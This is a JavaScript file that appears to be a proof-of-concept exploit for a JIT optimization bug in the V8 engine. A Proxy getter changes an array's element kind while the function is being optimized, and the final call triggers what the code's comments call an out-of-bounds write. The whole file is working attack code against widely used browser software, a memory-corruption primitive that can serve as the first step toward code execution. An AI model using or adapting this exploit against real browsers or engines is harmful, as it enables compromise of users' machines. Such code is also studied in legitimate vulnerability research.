// convert (big)int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}

let victim_arr = new Array(0x10002);
victim_arr[0] = 1.1; // element size is 8-byte

let p = new Proxy(Object, {
    get(target, prop, receiver) {
        victim_arr[0] = {}; // element size is 4-byte
        return Reflect.get(...arguments);
    }
});

function empty() { }

function f(new_target) {
    // add JSCreate to effect chain of |victim_arr|
    // same as |victim_arr.push(2.2)|
    return victim_arr.push(Reflect.construct(empty, arguments, new_target) ? 2.2 : 0);
}

function ff(new_target) {
    // if |f()| is outermost, |Reflect.construct()| is not be optimized to JSCreate
    // so wrap |f()| with |ff()|
    return f(new_target);
}

for (let i = 0; i < 0x10001; i++) { victim_arr.pop(); } // free up space for push

for (let i = 0; i < 0x10000; i++) { ff(empty); } // trigger optimization
ff(p); // oob write
